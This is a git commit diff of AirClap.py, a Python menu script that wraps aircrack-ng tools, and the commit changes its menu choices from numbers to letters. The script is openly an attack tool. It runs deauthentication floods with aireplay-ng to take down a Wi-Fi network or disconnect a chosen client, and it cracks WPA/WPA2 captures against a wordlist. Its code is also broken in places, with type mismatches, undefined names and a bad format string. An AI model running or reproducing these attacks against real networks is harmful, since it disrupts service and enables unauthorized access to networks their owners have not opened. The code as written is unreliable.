4de66809e86e50e4cdd10373d253a5a3e4dca017
Josiah Crofton <44535515+jobro247@users.noreply.github.com>
2018-11-22 10:38:18 -0800

    Update AirClap.py

--- AirClap.py
+++ AirClap.py
@@ -11,13 +11,13 @@ print ("Crack a wpa2, wpa wifi password /4")
 print ("Scan for clients /5")
 print ("-------------------------------------------")
 main_choice = raw_input("I choose:")
-if main_choice == 1:
+if main_choice == 'a':
   os.system("airodump-ng wlan0mon")
   print ("Make sure you copy the bssid of the network you want to target!")
   print ("And make sure to remeber the channel")
-if main_choice == 2:
+if main_choice == 'b':
   os.system("airmon-ng start wlan0")
-if main_choice == 3:
+if main_choice == 'c':
   lack = raw_input("Would you like to take down a network or just a target n/T:")
   if lack == n or N:
     t = raw_input("Enter the bssid of your target!:")
@@ -26,12 +26,12 @@ if main_choice == 3:
     p = raw_input("Enter the bssid of your target!:")
     aireplay_client = raw_input("Enter the client you want to target:")
     os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
-if main_choice == 4:
+if main_choice == 'd':
   path = raw_input("Enter the path your pcap file:")
   b = raw_input("Enter the bssid of the network your trying to crack:")
   wordlist = raw_input("Enter the path for the wordlist:")
   os.system("aircrack-ng -w $s -b $s $s" % (wordlist, b, path))
-if main_choice == 5:
+if main_choice == 'e':
   r = raw_input("Enter the bssid of the network your targeting")
   e = raw_input("Enter the channel of the network your targeting")
   os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (e, r))
